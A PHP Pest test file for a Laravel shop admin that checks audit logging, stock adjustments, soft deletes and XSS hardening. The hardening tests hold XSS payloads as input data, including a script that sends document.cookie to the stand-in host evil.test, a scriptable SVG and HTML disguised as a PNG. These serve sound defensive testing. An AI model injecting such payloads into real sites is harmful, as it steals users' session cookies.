<?php

use App\Enums\CustomerOrderStatus;
use App\Enums\InventoryMovementType;
use App\Enums\OrderSource;
use App\Enums\ReturnStage;
use App\Exceptions\InsufficientStockException;
use App\Models\Area;
use App\Models\Category;
use App\Models\City;
use App\Models\Country;
use App\Models\Customer;
use App\Models\Employee;
use App\Models\Governorate;
use App\Models\Order;
use App\Models\OrderReturn;
use App\Models\Product;
use App\Models\ProductVariant;
use App\Models\ReturnReason;
use App\Models\Treasury;
use App\Models\Warehouse;
use App\Models\WarehouseInventory;
use App\Services\Content\RichTextSanitizer;
use App\Services\Inventory\InventoryService;
use Database\Seeders\PermissionSeeder;
use Database\Seeders\RoleSeeder;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Spatie\Activitylog\Models\Activity;
use Spatie\Permission\Models\Role;

// Phase 7 — QA & Hardening (WAQAR-DELIVERY-ROADMAP.html). The roadmap's
// own "Done when" bar:
//
//   "a deleted product, a manual stock adjustment, and a role change each
//    leave a readable, attributed log entry"
//
// The first three tests below are that bar, one each, named after it.
// Everything after them covers the mechanism those three depend on, the
// soft-delete confirmation this phase also owns, and the three security
// findings carried over from the Phase 5 review.
//
// p7* prefix: Pest loads every Feature file into one global namespace.

function p7Employee(string $role): Employee
{
    $employee = Employee::create([
        'full_name' => $role.' User', 'email' => 'e7-'.uniqid().'@waqar.test', 'phone' => '01012345678',
        'password' => 'password', 'residence_address' => 'N/A', 'national_id_number' => '29001010100000',
    ]);
    $employee->assignRole(Role::findOrCreate($role, 'employee'));

    return $employee;
}

function p7Product(string $name = 'Linen Shirt'): Product
{
    return Product::create([
        'name' => ['en' => $name, 'ar' => 'قميص'],
        'slug' => 'p7-'.uniqid(),
        'sku' => 'P7-'.strtoupper(uniqid()),
        'price' => 250,
        'status' => true,
    ]);
}

/**
 * @return array{0: ProductVariant, 1: Warehouse}
 */
function p7Stock(int $quantity = 10, int $reserved = 0): array
{
    $warehouse = Warehouse::create(['name' => 'Main', 'address' => 'Cairo', 'phone' => '01012345678']);
    $variant = ProductVariant::create(['product_id' => p7Product()->id, 'sku' => 'V7-'.strtoupper(uniqid())]);
    WarehouseInventory::create([
        'warehouse_id' => $warehouse->id,
        'product_variant_id' => $variant->id,
        'quantity' => $quantity,
        'reserved_quantity' => $reserved,
    ]);

    return [$variant, $warehouse];
}

beforeEach(function () {
    $this->seed([RoleSeeder::class, PermissionSeeder::class]);
});

/*
|--------------------------------------------------------------------------
| The roadmap's three completion criteria
|--------------------------------------------------------------------------
*/

it('leaves a readable, attributed log entry when a product is deleted', function () {
    $actor = p7Employee('Vice Chairman');
    $product = p7Product('Silk Scarf');

    $this->actingAs($actor, 'employee');
    $product->delete();

    $entry = Activity::query()->where('subject_id', $product->id)->where('event', 'deleted')->sole();

    expect($entry->log_name)->toBe('catalog')
        // Readable: the name is in the entry itself, not only reachable
        // through a row that has just been deleted.
        ->and($entry->properties['label'])->toBe('Silk Scarf')
        // Attributed: to the employee, on a guard that is not the app's
        // default one.
        ->and($entry->causer_id)->toBe($actor->id)
        ->and($entry->causer_type)->toBe(Employee::class);
});

it('leaves a readable, attributed log entry when stock is manually adjusted', function () {
    [$variant, $warehouse] = p7Stock(quantity: 10);
    $actor = p7Employee('Warehouse Manager');

    $this->actingAs($actor, 'employee')
        ->post(route('admin.inventory.adjust'), [
            'product_variant_id' => $variant->id,
            'warehouse_id' => $warehouse->id,
            'quantity' => -3,
            'type' => InventoryMovementType::Damaged->value,
            'reason' => 'Water damage in aisle 4',
        ])->assertRedirect();

    expect(WarehouseInventory::where('product_variant_id', $variant->id)->value('quantity'))->toBe(7);

    $entry = Activity::query()->where('log_name', 'inventory')->latest('id')->first();

    expect($entry)->not->toBeNull()
        ->and($entry->event)->toBe('created')
        // Readable: which SKU, and which way the stock moved.
        ->and($entry->properties['label'])->toContain($variant->sku)
        ->and($entry->properties['label'])->toContain('-3')
        // The stated reason is part of the record, not a throwaway.
        ->and($entry->properties['attributes']['notes'])->toBe('Water damage in aisle 4')
        ->and($entry->causer_id)->toBe($actor->id);
});

it('leaves a readable, attributed log entry when an employee role changes', function () {
    $actor = p7Employee('Super Admin');
    $target = p7Employee('Checking');

    $this->actingAs($actor, 'employee');

    // Only the entries this change produces — creating the employee above
    // already granted it a role, which is itself (correctly) logged.
    $before = (int) Activity::max('id');
    $target->syncRoles(['Accounting']);

    $entries = Activity::query()
        ->where('id', '>', $before)
        ->where('log_name', 'access')
        ->where('subject_id', $target->id)
        ->whereIn('event', ['role_attached', 'role_detached'])
        ->orderBy('id')
        ->get();

    // A change reads as a pair — what was taken away, and what replaced
    // it. Either half alone would leave "changed to Accounting" without
    // saying from what.
    expect($entries->pluck('event')->all())->toContain('role_detached', 'role_attached')
        ->and($entries->firstWhere('event', 'role_detached')->properties['names'])->toBe(['Checking'])
        ->and($entries->firstWhere('event', 'role_attached')->properties['names'])->toBe(['Accounting'])
        ->and($entries->every(fn (Activity $entry) => $entry->causer_id === $actor->id))->toBeTrue();
});

/*
|--------------------------------------------------------------------------
| Attribution and the shape of an entry
|--------------------------------------------------------------------------
*/

it('attributes an action to the employee guard even though the default guard is the customer one', function () {
    // The regression this guards: auth.defaults.guard is `customer`, and
    // Spatie's stock resolver asks the default guard — so every audited
    // admin action logged a null causer until CauserResolver was
    // overridden in AppServiceProvider.
    expect(config('auth.defaults.guard'))->toBe('customer');

    $actor = p7Employee('Vice Chairman');
    $this->actingAs($actor, 'employee');

    $product = p7Product();
    $product->update(['price' => 999]);

    $entry = Activity::query()->where('subject_id', $product->id)->where('event', 'updated')->sole();

    expect($entry->causer_type)->toBe(Employee::class)->and($entry->causer_id)->toBe($actor->id);
});

it('records a customer as the causer for a storefront action', function () {
    $customer = Customer::create(['name' => 'Nour', 'email' => 'n7@waqar.test', 'phone' => '01012345678', 'password' => 'password']);

    $this->actingAs($customer, 'customer');
    $customer->update(['phone' => '01000000000']);

    $entry = Activity::query()->where('log_name', 'customers')->where('event', 'updated')->latest('id')->first();

    expect($entry->causer_type)->toBe(Customer::class)->and($entry->causer_id)->toBe($customer->id);
});

it('logs an unauthenticated console or queue action as a system action rather than mis-attributing it', function () {
    p7Product();

    $entry = Activity::query()->where('log_name', 'catalog')->latest('id')->first();

    expect($entry->causer_id)->toBeNull()->and($entry->causer_type)->toBeNull();
});

it('never writes credentials or PII into the audit trail', function () {
    $actor = p7Employee('Super Admin');
    $this->actingAs($actor, 'employee');

    $subject = p7Employee('Checking');
    $subject->update(['password' => 'a-new-secret', 'national_id_number' => '29901010100001', 'phone' => '01111111111']);

    $entries = Activity::query()->where('subject_id', $subject->id)->where('subject_type', Employee::class)->get();
    $serialised = $entries->pluck('properties')->toJson();

    expect($serialised)->not->toContain('password')
        ->not->toContain('national_id_number')
        ->not->toContain('29901010100001')
        // …while still recording the change that was made.
        ->and($entries->last()->properties['attributes']['phone'])->toBe('01111111111');
});

it('only records the fields that actually changed', function () {
    // Re-read before updating, the way route-model binding hands a
    // controller its model. A freshly *created* instance has no value in
    // memory for columns the database defaulted, so those would read as
    // "null -> false" changes — an artifact of the instance, not of the
    // logging (the same wrinkle PHASE-2-HANDOVER.md records).
    $product = p7Product()->fresh();
    $product->update(['price' => 300]);

    $entry = Activity::query()->where('subject_id', $product->id)->where('event', 'updated')->sole();

    expect(array_keys($entry->properties['attributes']))->toBe(['price'])
        ->and($entry->properties['old']['price'])->toBe('250.00');
});

it('keeps an entry readable after its subject has been soft-deleted', function () {
    $product = p7Product('Vanishing Coat');
    $product->delete();

    $entry = Activity::query()->where('subject_id', $product->id)->where('event', 'deleted')->sole();

    // Both halves matter: the snapshot survives regardless, and the
    // subject relation still resolves because activitylog is configured
    // to return soft-deleted subjects.
    expect($entry->properties['label'])->toBe('Vanishing Coat')
        ->and($entry->subject)->not->toBeNull()
        ->and($entry->subject->trashed())->toBeTrue();
});

it('logs a permission-matrix change against the role it was made on', function () {
    $actor = p7Employee('Super Admin');
    $role = Role::findOrCreate('Checking', 'employee');

    $this->actingAs($actor, 'employee')
        ->put(route('admin.roles.update', $role), ['permissions' => ['orders.view', 'orders.create']])
        ->assertRedirect();

    $entry = Activity::query()
        ->where('log_name', 'access')
        ->where('event', 'permission_attached')
        ->latest('id')
        ->first();

    expect($entry)->not->toBeNull()
        ->and($entry->properties['names'])->toContain('orders.create')
        ->and($entry->properties['label'])->toBe('Checking')
        ->and($entry->causer_id)->toBe($actor->id);
});

/*
|--------------------------------------------------------------------------
| The activity log screen
|--------------------------------------------------------------------------
*/

it('gates the activity log behind its own permission', function () {
    $this->actingAs(p7Employee('Checking'), 'employee')
        ->get(route('admin.activity-log.index'))
        ->assertForbidden();

    $this->actingAs(p7Employee('Chairman'), 'employee')
        ->get(route('admin.activity-log.index'))
        ->assertOk();
});

it('exposes no route that can alter or delete an audit entry', function () {
    $writable = collect(app('router')->getRoutes())
        ->filter(fn ($route) => str_contains($route->uri(), 'activity-log'))
        ->reject(fn ($route) => $route->methods() === ['GET', 'HEAD']);

    expect($writable)->toBeEmpty();
});

/*
|--------------------------------------------------------------------------
| Manual stock adjustment
|--------------------------------------------------------------------------
*/

it('refuses an adjustment that would cut into stock already reserved for confirmed orders', function () {
    [$variant, $warehouse] = p7Stock(quantity: 10, reserved: 8);

    expect(fn () => app(InventoryService::class)->adjust(
        $variant, $warehouse, -5, InventoryMovementType::Lost, 'Shrinkage'
    ))->toThrow(InsufficientStockException::class);

    // Nothing moved, and nothing was logged for a rejected attempt.
    expect(WarehouseInventory::where('product_variant_id', $variant->id)->value('quantity'))->toBe(10)
        ->and(Activity::where('log_name', 'inventory')->count())->toBe(0);
});

it('refuses to dress an order-flow movement up as a manual adjustment', function () {
    [$variant, $warehouse] = p7Stock();

    expect(fn () => app(InventoryService::class)->adjust(
        $variant, $warehouse, -1, InventoryMovementType::Sale, 'Not a manual correction'
    ))->toThrow(InvalidArgumentException::class);
});

it('requires the adjust permission, not merely the view one, to change stock', function () {
    [$variant, $warehouse] = p7Stock();
    $viewer = p7Employee('Checking');
    $viewer->givePermissionTo('inventory.view');

    // Can see the screen…
    $this->actingAs($viewer, 'employee')->get(route('admin.inventory.index'))->assertOk();

    // …but cannot change what is on it.
    $this->actingAs($viewer, 'employee')->post(route('admin.inventory.adjust'), [
        'product_variant_id' => $variant->id,
        'warehouse_id' => $warehouse->id,
        'quantity' => -1,
        'type' => InventoryMovementType::Adjustment->value,
        'reason' => 'Attempted without permission',
    ])->assertForbidden();

    expect(WarehouseInventory::where('product_variant_id', $variant->id)->value('quantity'))->toBe(10);
});

it('will not record a stock correction without a stated reason', function () {
    [$variant, $warehouse] = p7Stock();

    $this->actingAs(p7Employee('Warehouse Manager'), 'employee')
        ->post(route('admin.inventory.adjust'), [
            'product_variant_id' => $variant->id,
            'warehouse_id' => $warehouse->id,
            'quantity' => -1,
            'type' => InventoryMovementType::Adjustment->value,
        ])->assertSessionHasErrors('reason');
});

/*
|--------------------------------------------------------------------------
| Soft deletes (roadmap: "confirmed on products, categories, orders,
| customers, employees, returns, treasuries")
|--------------------------------------------------------------------------
*/

it('soft-deletes every model the roadmap names, keeping the row and the audit trail', function () {
    $warehouse = Warehouse::create(['name' => 'Main', 'address' => 'Cairo', 'phone' => '01012345678']);
    $customer = Customer::create(['name' => 'Nour', 'email' => 's7@waqar.test', 'phone' => '01012345678', 'password' => 'password']);

    $country = Country::create(['name' => ['ar' => 'مصر', 'en' => 'Egypt'], 'code' => 'EG']);
    $governorate = Governorate::create(['country_id' => $country->id, 'name' => ['ar' => 'القاهرة', 'en' => 'Cairo']]);
    $city = City::create(['governorate_id' => $governorate->id, 'name' => ['ar' => 'مدينة نصر', 'en' => 'Nasr City']]);
    $area = Area::create(['city_id' => $city->id, 'name' => ['ar' => 'منطقة أ', 'en' => 'Zone A']]);

    $subjects = [
        Product::class => p7Product(),
        Category::class => Category::create(['name' => ['en' => 'Coats', 'ar' => 'معاطف'], 'slug' => 'coats-'.uniqid(), 'status' => true, 'sort_order' => 0]),
        Customer::class => $customer,
        Employee::class => p7Employee('Checking'),
        Treasury::class => Treasury::create(['name' => 'Main Safe', 'type' => 'cash', 'current_balance' => 0]),
        Order::class => Order::create([
            'order_number' => '9'.random_int(1000, 9999), 'customer_id' => $customer->id,
            'order_source' => OrderSource::Website,
            'customer_status' => CustomerOrderStatus::Processing,
            'subtotal' => 100, 'shipping_amount' => 0, 'discount_amount' => 0, 'total' => 100,
            'shipping_recipient_name' => 'Nour', 'shipping_phone' => '1', 'shipping_address_line' => 'Cairo',
            'shipping_governorate_id' => $governorate->id, 'shipping_city_id' => $city->id,
            'shipping_area_id' => $area->id,
        ]),
    ];
    $subjects[OrderReturn::class] = OrderReturn::create([
        'order_id' => $subjects[Order::class]->id,
        'customer_id' => $customer->id,
        'stage' => ReturnStage::PostDelivery,
        'reason_id' => ReturnReason::create(['name' => ['en' => 'Wrong size', 'ar' => 'مقاس خاطئ']])->id,
    ]);

    foreach ($subjects as $class => $model) {
        $table = $model->getTable();
        $model->delete();

        expect($model->fresh()?->trashed())->toBeTrue("{$class} should soft-delete")
            ->and($class::withTrashed()->whereKey($model->getKey())->exists())->toBeTrue()
            ->and($class::whereKey($model->getKey())->exists())->toBeFalse()
            ->and(DB::table($table)->where('id', $model->getKey())->exists())
            ->toBeTrue("{$table} row should survive the delete");
    }

    expect($warehouse->exists)->toBeTrue();
});

it('restores a soft-deleted record and records the restore', function () {
    $actor = p7Employee('Vice Chairman');
    $this->actingAs($actor, 'employee');

    $product = p7Product('Second Chance');
    $product->delete();
    $product->restore();

    $entry = Activity::query()->where('subject_id', $product->id)->where('event', 'restored')->sole();

    expect($entry->causer_id)->toBe($actor->id)->and($product->fresh()->trashed())->toBeFalse();
});

/*
|--------------------------------------------------------------------------
| Hardening — the three findings carried over from the Phase 5 review
|--------------------------------------------------------------------------
*/

it('refuses a scriptable SVG uploaded as a category image', function () {
    Storage::fake('public');

    $svg = UploadedFile::fake()->createWithContent(
        'logo.svg',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>'
    );

    $this->actingAs(p7Employee('Vice Chairman'), 'employee')
        ->post(route('admin.categories.store'), [
            'name' => ['en' => 'Coats', 'ar' => 'معاطف'],
            'status' => true,
            'sort_order' => 0,
            'image' => $svg,
        ])->assertSessionHasErrors('image');

    expect(Storage::disk('public')->allFiles())->toBeEmpty();
});

it('refuses an HTML payload renamed to look like an image', function () {
    Storage::fake('public');

    // Deliberately a real file rather than UploadedFile::fake(): a faked
    // upload reports its MIME type from the *filename*, so it cannot
    // express the attack at all. Passing null for the type makes Symfony
    // guess from the content, which is what a real upload does.
    $path = tempnam(sys_get_temp_dir(), 'p7').'.png';
    file_put_contents($path, '<html><body><script>alert(1)</script></body></html>');
    $disguised = new UploadedFile($path, 'photo.png', null, null, true);

    $this->actingAs(p7Employee('Vice Chairman'), 'employee')
        ->post(route('admin.categories.store'), [
            'name' => ['en' => 'Coats', 'ar' => 'معاطف'],
            'status' => true,
            'sort_order' => 0,
            'image' => $disguised,
        ])->assertSessionHasErrors('image');
});

it('strips script out of a product description before it is ever stored', function () {
    $actor = p7Employee('Vice Chairman');

    $this->actingAs($actor, 'employee')->post(route('admin.products.store'), [
        'name' => ['en' => 'Jacket', 'ar' => 'جاكيت'],
        'sku' => 'XSS-'.strtoupper(uniqid()),
        'description' => [
            'en' => '<p>Warm</p><script>fetch("//evil.test?c="+document.cookie)</script>',
            'ar' => '<p onmouseover="alert(1)">دافئ</p>',
        ],
        'price' => 100, 'status' => true, 'is_featured' => false, 'is_new' => false,
        'is_on_sale' => false, 'sort_order' => 0, 'product_type' => 'real',
        'variants' => [['sku' => 'XSS-V-'.strtoupper(uniqid()), 'status' => true]],
    ])->assertRedirect();

    $product = Product::latest('id')->first();

    // The markup an author legitimately wrote survives…
    expect($product->getTranslation('description', 'en'))->toContain('Warm')
        // …the script and the inline handler do not.
        ->not->toContain('<script')
        ->not->toContain('evil.test')
        ->and($product->getTranslation('description', 'ar'))->not->toContain('onmouseover');
});

it('keeps the formatting the rich-text editor produces', function () {
    $sanitizer = app(RichTextSanitizer::class);

    $clean = $sanitizer->clean('<h2>Care</h2><ul><li><strong>Cold</strong> wash</li></ul><a href="https://waqar.test">Guide</a>');

    expect($clean)->toContain('<h2>')->toContain('<ul>')->toContain('<strong>')->toContain('href="https://waqar.test"');
});

it('drops javascript: and data: URLs from rich text', function () {
    $sanitizer = app(RichTextSanitizer::class);

    expect($sanitizer->clean('<a href="javascript:alert(1)">x</a>'))->not->toContain('javascript:')
        ->and($sanitizer->clean('<img src="data:text/html;base64,PHNjcmlwdD4=">'))->not->toContain('data:text/html');
});

it('sends a Content-Security-Policy that forbids inline script on both areas', function () {
    foreach (['/en', '/en/admin/login'] as $path) {
        $policy = $this->get($path)->headers->get('Content-Security-Policy');

        expect($policy)->not->toBeNull("{$path} should carry a CSP")
            ->toContain("default-src 'self'")
            ->toContain("object-src 'none'")
            ->toContain("frame-ancestors 'none'")
            // The whole point: an injected <script> without the
            // per-request nonce does not run.
            ->not->toContain("script-src 'self' 'unsafe-inline'");

        expect($policy)->toMatch("/script-src [^;]*'nonce-[A-Za-z0-9]+'/");
    }
});

it('gives every page a fresh nonce rather than a reusable one', function () {
    $first = $this->get('/en')->headers->get('Content-Security-Policy');
    $second = $this->get('/en')->headers->get('Content-Security-Policy');

    expect($first)->not->toBe($second);
});
